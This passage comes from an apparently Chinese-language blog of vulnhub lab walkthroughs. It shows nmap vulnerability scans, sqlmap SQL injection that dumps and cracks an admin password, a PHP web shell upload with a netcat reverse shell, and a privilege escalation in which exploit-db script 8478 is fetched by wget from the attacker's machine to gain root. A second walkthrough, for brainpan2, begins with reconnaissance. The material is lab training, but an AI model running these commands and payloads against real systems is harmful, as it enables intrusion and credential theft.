https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use anonymous</span></span><br><span class="line"><span class="string">|       Diffie-Hellman key exchange only provide protection against passive</span></span><br><span class="line"><span class="string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span></span><br><span class="line"><span class="string">|       which could completely compromise the confidentiality and integrity</span></span><br><span class="line"><span class="string">|       of any data exchanged over the resulting session.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       ANONYMOUS DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.ietf.org/rfc/rfc2246.txt</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span></span><br><span class="line"><span class="string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span></span><br><span class="line"><span class="string">|       triggered when handling Diffie-Hellman key exchanges defined with</span></span><br><span class="line"><span class="string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span></span><br><span class="line"><span class="string">|       to downgrade the security of a TLS session to 512-bit export-grade</span></span><br><span class="line"><span class="string">|       cryptography, which is significantly weaker, allowing the attacker</span></span><br><span class="line"><span class="string">|       to more easily break the encryption and monitor or tamper with</span></span><br><span class="line"><span class="string">|       the encrypted stream.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2015-5-19</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       EXPORT-GRADE DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://weakdh.org</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/74733</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">3306/tcp open  mysql      MySQL 5.0.45</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:mysql:mysql:5.0.45: </span></span><br><span class="line"><span class="string">|       CVE-2009-2446   8.5     https://vulners.com/cve/CVE-2009-2446</span></span><br><span class="line"><span class="string">|       CVE-2008-0226   7.5     https://vulners.com/cve/CVE-2008-0226</span></span><br><span class="line"><span class="string">|       CVE-2009-5026   6.8     https://vulners.com/cve/CVE-2009-5026</span></span><br><span class="line"><span class="string">|       CVE-2009-4028   6.8     https://vulners.com/cve/CVE-2009-4028</span></span><br><span class="line"><span class="string">|       CVE-2010-1848   6.5     https://vulners.com/cve/CVE-2010-1848</span></span><br><span class="line"><span class="string">|       CVE-2010-1850   6.0     https://vulners.com/cve/CVE-2010-1850</span></span><br><span class="line"><span class="string">|       CVE-2008-7247   6.0     https://vulners.com/cve/CVE-2008-7247</span></span><br><span class="line"><span class="string">|       CVE-2010-3833   5.0     https://vulners.com/cve/CVE-2010-3833</span></span><br><span class="line"><span class="string">|       CVE-2010-1849   5.0     https://vulners.com/cve/CVE-2010-1849</span></span><br><span class="line"><span class="string">|       CVE-2008-4098   4.6     https://vulners.com/cve/CVE-2008-4098</span></span><br><span class="line"><span class="string">|       CVE-2008-2079   4.6     https://vulners.com/cve/CVE-2008-2079</span></span><br><span class="line"><span class="string">|       CVE-2012-0490   4.0     https://vulners.com/cve/CVE-2012-0490</span></span><br><span class="line"><span class="string">|       CVE-2012-0484   4.0     https://vulners.com/cve/CVE-2012-0484</span></span><br><span class="line"><span class="string">|       CVE-2012-0102   4.0     https://vulners.com/cve/CVE-2012-0102</span></span><br><span class="line"><span class="string">|       CVE-2012-0101   4.0     https://vulners.com/cve/CVE-2012-0101</span></span><br><span class="line"><span class="string">|       CVE-2012-0087   4.0     https://vulners.com/cve/CVE-2012-0087</span></span><br><span class="line"><span class="string">|       CVE-2010-3838   4.0     https://vulners.com/cve/CVE-2010-3838</span></span><br><span class="line"><span class="string">|       CVE-2010-3837   4.0     https://vulners.com/cve/CVE-2010-3837</span></span><br><span class="line"><span class="string">|       CVE-2010-3836   4.0     https://vulners.com/cve/CVE-2010-3836</span></span><br><span class="line"><span class="string">|       CVE-2010-3834   4.0     https://vulners.com/cve/CVE-2010-3834</span></span><br><span class="line"><span class="string">|       CVE-2010-3682   4.0     https://vulners.com/cve/CVE-2010-3682</span></span><br><span class="line"><span class="string">|       CVE-2010-3677   4.0     https://vulners.com/cve/CVE-2010-3677</span></span><br><span class="line"><span class="string">|       CVE-2009-4019   4.0     https://vulners.com/cve/CVE-2009-4019</span></span><br><span class="line"><span class="string">|       CVE-2008-3963   4.0     https://vulners.com/cve/CVE-2008-3963</span></span><br><span class="line"><span class="string">|       CVE-2010-1626   3.6     https://vulners.com/cve/CVE-2010-1626</span></span><br><span class="line"><span class="string">|       CVE-2012-0114   3.0     https://vulners.com/cve/CVE-2012-0114</span></span><br><span class="line"><span class="string">|       CVE-2008-4456   2.6     https://vulners.com/cve/CVE-2008-4456</span></span><br><span class="line"><span class="string">|_      CVE-2012-0075   1.7     https://vulners.com/cve/CVE-2012-0075</span></span><br></pre></td></tr></table></figure>

<p>可以发现开了很多端口和服务，存在非常多的漏洞</p>
<p>点击主页上的read more,发现存在id参数，抓包直接sqlmap注入一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:33:15 /2019-12-17/</span><br><span class="line"></span><br><span class="line">[10:33:15] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[10:33:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[10:33:16] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=4 AND 8397=8397</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 7 columns</span><br><span class="line">    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY</span><br><span class="line">---</span><br><span class="line">[10:33:16] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[10:33:16] [INFO] fetched data logged to text files under <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 10:33:16 /2019-12-17/</span><br></pre></td></tr></table></figure>

<p>得到登录的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt -D cms -T user --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:25:54 /2019-12-17/</span><br><span class="line"></span><br><span class="line">[10:25:54] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[10:25:54] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[10:25:54] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=4 AND 8397=8397</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=4 OR (SELECT 1251 FROM (SELECT(SLEEP(5)))iJMb)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 7 columns</span><br><span class="line">    Payload: id=4 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x5477494d6f456c6a6e4e72506d666a7a565248436e516d504f497075554b6169514b706166706b6e,0x7162716b71),NULL,NULL,NULL,NULL-- rTAY</span><br><span class="line">---</span><br><span class="line">[10:25:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[10:25:54] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;cms&#x27;</span></span><br><span class="line">[10:25:54] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;cms&#x27;</span></span><br><span class="line">[10:25:54] [INFO] recognized possible password hashes <span class="keyword">in</span> column <span class="string">&#x27;user_password&#x27;</span></span><br><span class="line"><span class="keyword">do</span> you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing with other tools [y/N] N</span><br><span class="line"><span class="keyword">do</span> you want to crack them via a dictionary-based attack? [Y/n/q] Y</span><br><span class="line">[10:25:54] [INFO] using <span class="built_in">hash</span> method <span class="string">&#x27;md5_generic_passwd&#x27;</span></span><br><span class="line">what dictionary <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] default dictionary file <span class="string">&#x27;D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1\data\txt\wordlist.tx_&#x27;</span> (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[10:25:54] [INFO] using default dictionary</span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [y/N] N</span><br><span class="line">[10:25:54] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[10:25:54] [INFO] starting 12 processes</span><br><span class="line">[10:25:58] [INFO] cracked password <span class="string">&#x27;adminpass&#x27;</span> <span class="keyword">for</span> <span class="built_in">hash</span> <span class="string">&#x27;25e4ee4e9229397b6b17776bfceaf8e7&#x27;</span></span><br><span class="line">[10:26:04] [INFO] current status: ZZyZZ... \Database: cms</span><br><span class="line">Table: user</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line">| user_id | user_password                                | user_username |</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line">| 1       | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) | admin         |</span><br><span class="line">+---------+----------------------------------------------+---------------+</span><br><span class="line"></span><br><span class="line">[10:26:04] [INFO] table <span class="string">&#x27;cms.`user`&#x27;</span> dumped to CSV file <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129\dump\cms\user.csv&#x27;</span></span><br><span class="line">[10:26:04] [INFO] fetched data logged to text files under <span class="string">&#x27;C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.142.129&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 10:26:04 /2019-12-17/</span><br></pre></td></tr></table></figure>

<p>成功之后直接上传.php文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub64.jpg"></p>
<p>如下图所示成功上传，然后访问shell，kali端nc -lvp 5566监听</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub65.jpg"></p>
<p>成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.142.129: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.142.128] from (UNKNOWN) [192.168.142.129] 37560</span><br><span class="line">Linux localhost.localdomain 2.6.18-92.el5 <span class="comment">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 02:37:06 up  1:08,  0 users,  load average: 0.10, 0.08, 0.45</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh-3.2$ whoami</span><br><span class="line">apache</span><br><span class="line">sh-3.2$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>命令行信息收集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh-3.2$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.18-92.el5 <span class="comment">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span></span><br><span class="line">sh-3.2$ cat /etc/*release*</span><br><span class="line">cat: /etc/lsb-release.d: Is a directory</span><br><span class="line">CentOS release 5.2 (Final)</span><br></pre></td></tr></table></figure>

<p>下载提权脚本开始提权，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvODQ3OA==">exploits-8478<i class="fa fa-external-link-alt"></i></span></p>
<p>kali执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>shell中执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ wget http://192.168.142.128:8000/8478.sh</span><br><span class="line">wget http://192.168.142.128:8000/8478.sh</span><br><span class="line">--02:52:03--  http://192.168.142.128:8000/8478.sh</span><br><span class="line">Connecting to 192.168.142.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3498 (3.4K) [text/x-sh]</span><br><span class="line">Saving to: `8478.sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[=======================================&gt;] 3,498       --.-K/s   in 0s     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">02:52:03 (603 MB/s) - `8478.sh&#x27;</span> saved [3498/3498]</span><br></pre></td></tr></table></figure>
<p>该漏洞利用程序需要udev进程的PID，运行脚本开始提权，该漏洞利用程序无法完美运行，在下面看到的那样，需要进行多次尝试才能获得root shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-3.2$ cat /proc/net/netlink</span><br><span class="line">sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks</span><br><span class="line">cf865000 0   2930   00000111 0        0        00000000 2</span><br><span class="line">cfebce00 0   0      00000000 0        0        00000000 2</span><br><span class="line">cfc94a00 6   0      00000000 0        0        00000000 2</span><br><span class="line">cfe70600 7   0      00000000 0        0        00000000 2</span><br><span class="line">cf86ec00 9   2260   00000000 0        0        00000000 2</span><br><span class="line">cfe5fe00 9   0      00000000 0        0        00000000 2</span><br><span class="line">cf54fc00 10  0      00000000 0        0        00000000 2</span><br><span class="line">cf517c00 11  0      00000000 0        0        00000000 2</span><br><span class="line">cfebcc00 15  0      00000000 0        0        00000000 2</span><br><span class="line">cfc94400 15  554    ffffffff 0        0        00000000 2</span><br><span class="line">cf517a00 16  0      00000000 0        0        00000000 2</span><br><span class="line">cfd2fa00 18  0      00000000 0        0        00000000 2</span><br><span class="line">sh-3.2$ sed -i -e <span class="string">&#x27;s/\r$//&#x27;</span> 8478.sh</span><br><span class="line">sh-3.2$ ./8478.sh 554</span><br><span class="line">suid.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">suid.c:3: warning: incompatible implicit declaration of built-in <span class="keyword">function</span> <span class="string">&#x27;execl&#x27;</span></span><br><span class="line">sh-3.2$ ./8478.sh 554</span><br><span class="line">./8478.sh 554</span><br><span class="line">suid.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">suid.c:3: warning: incompatible implicit declaration of built-in <span class="keyword">function</span> <span class="string">&#x27;execl&#x27;</span></span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub66.jpg"></p>
<p>提权成功,注意，脚本下载完成后运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">&#x27;s/\r$//&#x27;</span> 8478.sh</span><br></pre></td></tr></table></figure>

<p>这条命令很重要，不运行此命令，脚本无法执行</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan2]</title>
    <url>/2020/02/01/brainpan2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
<ul>
<li>VMware Player 6.0.1</li>
<li>VMWare Fusion 6.0.2</li>
<li>VirtualBox 4.3.2</li>
</ul>
<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>

<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                